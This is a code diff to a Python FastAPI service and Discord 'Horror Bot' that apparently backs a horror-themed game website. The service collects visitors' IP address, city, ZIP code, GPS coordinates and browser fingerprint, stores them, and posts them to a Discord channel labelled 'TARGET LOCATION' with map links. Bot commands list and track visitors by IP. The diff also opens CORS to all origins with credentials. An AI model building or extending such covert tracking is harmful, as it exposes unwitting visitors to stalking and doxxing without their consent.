@@ -2,6 +2,7 @@ import os
 import json
 import random
 import asyncio
+import threading
 from datetime import datetime
 from fastapi import FastAPI, Request, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
@@ -27,9 +28,11 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 # FastAPI Setup
 app = FastAPI()
 
+# Allow all origins for now (you can restrict later)
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["https://gamef-swart.vercel.app"],
+    allow_origins=["*"],  # Changed to allow all for testing
+    allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
@@ -37,12 +40,21 @@ app.add_middleware(
 # Data storage
 tracked_users = {}
 command_counter = 0
+bot_ready = False
 
 # ==================== DISCORD BOT ====================
 @bot.event
 async def on_ready():
+    global bot_ready
+    bot_ready = True
     print(f'🎮 Horror Bot is online as {bot.user}')
+    print(f'📡 Connected to Discord!')
     await bot.change_presence(activity=discord.Game(name="Watching 👁️"))
+
+@bot.event
+async def on_command_error(ctx, error):
+    print(f"Bot error: {error}")
+    await ctx.send(f"⚠️ Error: {error}")
 
 # Cool embed generator
 def create_horror_embed(title: str, data: dict, user_info: Optional[dict] = None):
@@ -54,68 +66,91 @@ def create_horror_embed(title: str, data: dict, user_info: Optional[dict] = None
         color=random.choice(colors)
     )
     
-    # Add scary fields
-    if data.get('type') == 'location':
-        coords = data.get('data', {}).get('coordinates', {})
+    # Extract data properly
+    data_content = data.get('data', data) if isinstance(data, dict) else {}
+    
+    # Add scary fields based on type
+    if data.get('type') == 'location' or 'lat' in str(data_content):
+        # Handle location data
+        lat = data_content.get('lat', 'unknown')
+        lon = data_content.get('lon', 'unknown')
+        city = data_content.get('city', 'unknown')
+        state = data_content.get('state', 'unknown')
+        zip_code = data_content.get('zip', 'unknown')
+        ip = data_content.get('ip', 'unknown')
+        
         embed.add_field(
             name="📍 TARGET LOCATION",
-            value=f"```\nLat: {coords.get('lat', 'unknown')}\nLon: {coords.get('lon', 'unknown')}\nAcc: {coords.get('accuracy', 'unknown')}m```",
+            value=f"```\nIP: {ip}\nCity: {city}\nState: {state}\nZIP: {zip_code}\nLat: {lat}\nLon: {lon}```",
             inline=False
         )
         
         # Add Google Maps link
-        if coords.get('lat') and coords.get('lon'):
-            maps_url = f"https://www.google.com/maps?q={coords['lat']},{coords['lon']}"
+        if lat != 'unknown' and lon != 'unknown':
+            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
             embed.add_field(name="🗺️ MAP LINK", value=f"[View Target]({maps_url})", inline=False)
     
-    elif data.get('type') == 'fingerprint':
-        fp = data.get('data', {})
-        browser = fp.get('browser', {})
+    elif data.get('type') == 'fragment' or 'fragment' in str(data):
+        # Handle puzzle fragment collection
+        fragment_id = data_content.get('id', 'unknown')
+        fragment_title = data_content.get('title', 'unknown')
         
-        embed.add_field(name="💻 SYSTEM", value=f"```{fp.get('os', 'unknown')}```", inline=True)
-        embed.add_field(name="🌐 IP", value=f"```{fp.get('ip', 'unknown')}```", inline=True)
-        embed.add_field(name="🖥️ SCREEN", value=f"```{fp.get('screen', {}).get('width')}x{fp.get('screen', {}).get('height')}```", inline=True)
-        embed.add_field(name="⏰ TIMEZONE", value=f"```{fp.get('timezone', {}).get('zone', 'unknown')}```", inline=True)
-        embed.add_field(name="🌍 LANGUAGE", value=f"```{browser.get('language', 'unknown')}```", inline=True)
-        embed.add_field(name="🎮 CORES", value=f"```{browser.get('hardwareConcurrency', 'unknown')}```", inline=True)
+        embed.add_field(
+            name="📖 FRAGMENT COLLECTED",
+            value=f"```ID: {fragment_id}\nTitle: {fragment_title}```",
+            inline=False
+        )
         
-        if fp.get('cameras'):
-            embed.add_field(name="📸 CAMERAS", value=f"```{len(fp['cameras'])} detected```", inline=True)
-    
-    elif data.get('type') == 'button':
-        embed.add_field(name="🚫 BUTTON PRESSES", value=f"```{data.get('data', {}).get('presses', 0)}```", inline=True)
-        
-        # Scary messages based on count
-        if data.get('data', {}).get('presses') == 9:
-            embed.add_field(name="👁️ MESSAGE", value="```They're watching...```", inline=False)
-    
-    elif data.get('type') == 'scream':
-        embed.add_field(name="📢 SCREAMS", value=f"```{data.get('data', {}).get('count', 0)}```", inline=True)
-        
-        if data.get('data', {}).get('count') >= 22:
-            embed.add_field(name="🤫 WHISPER", value="```Helsinki at midnight```", inline=False)
-    
-    elif data.get('type') == 'name':
-        embed.add_field(name="🎵 NAME ENTERED", value=f"```{data.get('data', {}).get('name', 'unknown')}```", inline=True)
+        total = data_content.get('total', 20)
+        found = data_content.get('found', 0)
+        embed.add_field(name="📊 PROGRESS", value=f"```{found}/{total}```", inline=True)
     
     elif data.get('type') == 'chaos':
-        embed.add_field(name="🌀 CHAOS UNLEASHED", value="```Protocol activated```", inline=True)
+        # Handle chaos button presses
+        button = data_content.get('button', 'unknown')
+        effect = data_content.get('effect', 'unknown')
+        
+        embed.add_field(
+            name="🌀 CHAOS UNLEASHED",
+            value=f"```Button: {button}\nEffect: {effect}```",
+            inline=False
+        )
+    
+    elif data.get('type') == 'system':
+        # Handle system fingerprint
+        browser = data_content.get('browser', 'unknown')
+        os = data_content.get('os', 'unknown')
+        screen = data_content.get('screen', 'unknown')
+        cores = data_content.get('cores', 'unknown')
+        
+        embed.add_field(name="💻 SYSTEM", value=f"```{os}```", inline=True)
+        embed.add_field(name="🌐 BROWSER", value=f"```{browser[:30]}...```", inline=True)
+        embed.add_field(name="🖥️ SCREEN", value=f"```{screen}```", inline=True)
+        embed.add_field(name="⚡ CORES", value=f"```{cores}```", inline=True)
+    
+    else:
+        # Generic data
+        data_str = json.dumps(data_content, indent=2)[:500]
+        embed.add_field(name="📦 DATA", value=f"```{data_str}```", inline=False)
     
     # Add user info if available
     if user_info:
         embed.set_footer(text=f"User: {user_info.get('ip', 'unknown')} | {user_info.get('time', '')}")
-    
-    # Random spooky footer
-    spooky_footers = [
-        "They know where you live",
-        "The cameras are watching",
-        "Your screen is being recorded",
-        "We can see you",
-        "Don't turn around",
-        "Behind you",
-        "👁️"
-    ]
-    embed.set_footer(text=random.choice(spooky_footers))
+    else:
+        # Random spooky footer
+        spooky_footers = [
+            "They know where you live",
+            "The fragments are scattered",
+            "Your screen is being recorded",
+            "We can see you",
+            "Don't turn around",
+            "Behind you",
+            "👁️",
+            "The puzzle continues",
+            "Find all 20 pieces",
+            "The truth is hidden"
+        ]
+        embed.set_footer(text=random.choice(spooky_footers))
     
     return embed
 
@@ -123,18 +158,32 @@ def create_horror_embed(title: str, data: dict, user_info: Optional[dict] = None
 @bot.command(name='track')
 async def track_user(ctx, user_id: str = None):
     """Track a specific user by ID"""
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
+        
     if user_id and user_id in tracked_users:
         data = tracked_users[user_id]
-        embed = create_horror_embed(f"TRACKING USER {user_id[:8]}", data, data.get('user_info'))
+        embed = create_horror_embed(f"TRACKING USER {user_id[:8]}", data.get('data', {}), data.get('user_info'))
         await ctx.send(embed=embed)
     else:
-        await ctx.send("⚠️ User not found or no ID provided")
+        # Show list of recent users
+        if tracked_users:
+            recent = list(tracked_users.keys())[-5:]
+            users_list = "\n".join([f"• {uid[:8]}..." for uid in recent])
+            await ctx.send(f"⚠️ User not found. Recent users:\n{users_list}\n\nUse `!track [id]` with one of these IDs")
+        else:
+            await ctx.send("⚠️ No users tracked yet")
 
 @bot.command(name='stats')
 async def show_stats(ctx):
     """Show tracking statistics"""
     global command_counter
     command_counter += 1
+    
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
     
     embed = Embed(
         title="📊 SURVEILLANCE STATISTICS",
@@ -145,40 +194,40 @@ async def show_stats(ctx):
     embed.add_field(name="📝 Commands Run", value=f"```{command_counter}```", inline=True)
     embed.add_field(name="🎮 Bot Status", value="```ACTIVE```", inline=True)
     
-    # Location stats
-    locations = sum(1 for u in tracked_users.values() 
-                   if u.get('data', {}).get('coordinates'))
-    embed.add_field(name="📍 Located Users", value=f"```{locations}```", inline=True)
+    # Fragment stats
+    total_fragments = sum(1 for u in tracked_users.values() 
+                         if u.get('data', {}).get('type') == 'fragment')
+    embed.add_field(name="📖 Fragments", value=f"```{total_fragments}```", inline=True)
     
-    # Camera stats
-    cameras = sum(len(u.get('data', {}).get('cameras', [])) 
-                  for u in tracked_users.values())
-    embed.add_field(name="📸 Cameras Found", value=f"```{cameras}```", inline=True)
+    # Chaos stats
+    chaos_count = sum(1 for u in tracked_users.values() 
+                     if u.get('data', {}).get('type') == 'chaos')
+    embed.add_field(name="🌀 Chaos Events", value=f"```{chaos_count}```", inline=True)
     
     await ctx.send(embed=embed)
 
 @bot.command(name='alert')
 async def send_alert(ctx, *, message: str):
-    """Send a creepy alert to all tracked users"""
+    """Send a creepy alert"""
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
+        
     embed = Embed(
         title="⚠️ GLOBAL ALERT ⚠️",
         description=f"```{message}```",
         color=Color.dark_red()
     )
-    embed.set_footer(text="This message appears on all tracked devices")
-    
-    # In a real implementation, this would send to frontend via WebSocket
+    embed.set_footer(text="The fragments are watching")
     await ctx.send(embed=embed)
-
-@bot.command(name='closest')
-async def closest_target(ctx):
-    """Find the closest tracked user"""
-    # This would need actual location comparison
-    await ctx.send("🔍 Scanning for nearest target... (implement with real data)")
 
 @bot.command(name='help_horror')
 async def horror_help(ctx):
     """Show all commands"""
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
+        
     embed = Embed(
         title="👁️ HORROR BOT COMMANDS",
         description="All surveillance commands",
@@ -189,10 +238,11 @@ async def horror_help(ctx):
         "`!track [id]` - Track specific user",
         "`!stats` - Show surveillance statistics",
         "`!alert [message]` - Send global alert",
-        "`!closest` - Find nearest target",
-        "`!broadcast` - Broadcast to all users",
-        "`!scream` - Make all users scream",
-        "`!glitch` - Glitch all connected screens"
+        "`!users` - List recent users",
+        "`!clear` - Clear all tracked users",
+        "`!broadcast [msg]` - Broadcast message",
+        "`!scream` - Make everyone scream",
+        "`!glitch` - Glitch all screens"
     ]
     
     embed.add_field(name="📡 AVAILABLE COMMANDS", value="\n".join(commands_list), inline=False)
@@ -200,9 +250,46 @@ async def horror_help(ctx):
     
     await ctx.send(embed=embed)
 
+@bot.command(name='users')
+async def list_users(ctx):
+    """List recent users"""
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
+        
+    if not tracked_users:
+        await ctx.send("📡 No users tracked yet")
+        return
+    
+    users_list = []
+    for uid, data in list(tracked_users.items())[-10:]:
+        ip = data.get('user_info', {}).get('ip', 'unknown')
+        time = data.get('user_info', {}).get('time', 'unknown')[-8:]
+        users_list.append(f"• `{uid[:8]}` - {ip} - {time}")
+    
+    embed = Embed(
+        title="👥 RECENT USERS",
+        description="\n".join(users_list),
+        color=Color.dark_red()
+    )
+    embed.set_footer(text=f"Total: {len(tracked_users)} users")
+    await ctx.send(embed=embed)
+
+@bot.command(name='clear')
+async def clear_users(ctx):
+    """Clear all tracked users"""
+    if not bot_ready:
+        await ctx.send("⚠️ Bot is still initializing...")
+        return
+        
+    global tracked_users
+    count = len(tracked_users)
+    tracked_users = {}
+    await ctx.send(f"🧹 Cleared {count} users from tracking")
+
 @bot.command(name='broadcast')
 async def broadcast(ctx, *, message: str):
-    """Broadcast a message to all connected users"""
+    """Broadcast a message"""
     embed = Embed(
         title="📢 SYSTEM BROADCAST",
         description=f"```{message}```",
@@ -213,7 +300,7 @@ async def broadcast(ctx, *, message: str):
 
 @bot.command(name='scream')
 async def make_scream(ctx):
-    """Make all users hear a scream"""
+    """Make everyone scream"""
     embed = Embed(
         title="🔊 GLOBAL SCREAM",
         description="```AAAAAAAAAAAAAAAAAAAAH```",
@@ -242,6 +329,8 @@ async def track_user_data(request: Request):
         data = await request.json()
         client_ip = request.client.host
         
+        print(f"📡 Received data from {client_ip}: {data.get('type', 'unknown')}")
+        
         # Store user data
         user_id = f"{client_ip}_{datetime.now().timestamp()}"
         tracked_users[user_id] = {
@@ -253,26 +342,40 @@ async def track_user_data(request: Request):
             }
         }
         
-        # Send to Discord
-        channel = bot.get_channel(CHANNEL_ID)
-        if channel:
-            embed = create_horror_embed(
-                f"NEW TARGET ACQUIRED",
-                data,
-                {'ip': client_ip, 'time': datetime.now().strftime('%H:%M:%S')}
-            )
-            await channel.send(embed=embed)
-            
-            # If location data exists, send map
-            if data.get('data', {}).get('coordinates'):
-                coords = data['data']['coordinates']
-                if coords.get('lat') and coords.get('lon'):
-                    maps_url = f"https://www.google.com/maps?q={coords['lat']},{coords['lon']}"
-                    await channel.send(f"📍 [Target Location]({maps_url})")
+        # Clean up old users (keep last 100)
+        if len(tracked_users) > 100:
+            oldest = sorted(tracked_users.keys())[:50]
+            for uid in oldest:
+                del tracked_users[uid]
         
-        return JSONResponse({"status": "tracked", "user_id": user_id})
+        # Send to Discord if bot is ready
+        if bot_ready:
+            try:
+                channel = bot.get_channel(CHANNEL_ID)
+                if channel:
+                    embed = create_horror_embed(
+                        f"NEW DATA - {data.get('type', 'unknown').upper()}",
+                        data,
+                        {'ip': client_ip, 'time': datetime.now().strftime('%H:%M:%S')}
+                    )
+                    await channel.send(embed=embed)
+                    
+                    # If location data exists, send map
+                    data_content = data.get('data', {})
+                    if data.get('type') == 'location':
+                        maps_url = f"https://www.google.com/maps?q={data_content.get('lat')},{data_content.get('lon')}"
+                        await channel.send(f"📍 [Target Location]({maps_url})")
+            except Exception as e:
+                print(f"Discord send error: {e}")
+        
+        return JSONResponse({
+            "status": "tracked", 
+            "user_id": user_id,
+            "total_users": len(tracked_users)
+        })
     
     except Exception as e:
+        print(f"Error tracking data: {e}")
         return JSONResponse({"error": str(e)}, status_code=500)
 
 @app.get("/api/stats")
@@ -281,26 +384,39 @@ async def get_stats():
     return {
         "total_users": len(tracked_users),
         "active_sessions": len(tracked_users),
+        "bot_ready": bot_ready,
         "last_update": datetime.now().isoformat()
     }
 
-@app.get("/api/broadcast/{message}")
-async def broadcast_message(message: str):
-    """Broadcast a message to all users (would use WebSocket in production)"""
-    return {"status": "broadcasted", "message": message, "users": len(tracked_users)}
+@app.get("/api/health")
+async def health_check():
+    """Health check endpoint"""
+    return {
+        "status": "alive",
+        "bot_ready": bot_ready,
+        "users_tracked": len(tracked_users),
+        "timestamp": datetime.now().isoformat()
+    }
 
 # ==================== RUN BOTH ====================
 async def run_bot():
-    await bot.start(TOKEN)
+    try:
+        await bot.start(TOKEN)
+    except Exception as e:
+        print(f"Bot failed to start: {e}")
 
 def run_api():
+    print("🚀 Starting FastAPI server on port 8000...")
     uvicorn.run(app, host="0.0.0.0", port=8000)
 
 if __name__ == "__main__":
-    import threading
+    print("🎮 Starting Horror Bot and API...")
     
     # Run bot in separate thread
-    bot_thread = threading.Thread(target=lambda: asyncio.run(run_bot()))
+    def start_bot():
+        asyncio.run(run_bot())
+    
+    bot_thread = threading.Thread(target=start_bot, daemon=True)
     bot_thread.start()
     
     # Run API
